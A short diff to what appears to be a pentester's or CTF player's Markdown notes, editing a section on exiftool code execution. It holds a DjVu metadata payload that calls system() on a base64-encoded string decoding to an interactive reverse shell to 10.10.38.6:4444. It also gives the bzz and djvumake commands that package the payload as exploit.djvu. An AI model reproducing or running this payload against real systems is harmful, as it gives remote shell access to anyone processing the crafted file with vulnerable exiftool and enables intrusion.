@@ -25,7 +25,9 @@ exiftool -a -u brochure.pdf
 
 ## exiftool code execution
 ```bash
-payload : (metadata "\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMzguNi80NDQ0IDA+JjEK | base64 -d | bash')};")
+#cat payload
+(metadata "\c${system('echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMzguNi80NDQ0IDA+JjEK | base64 -d | bash')};")
+
 bzz payload payload.bzz
 djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz
 file exploit.djvu
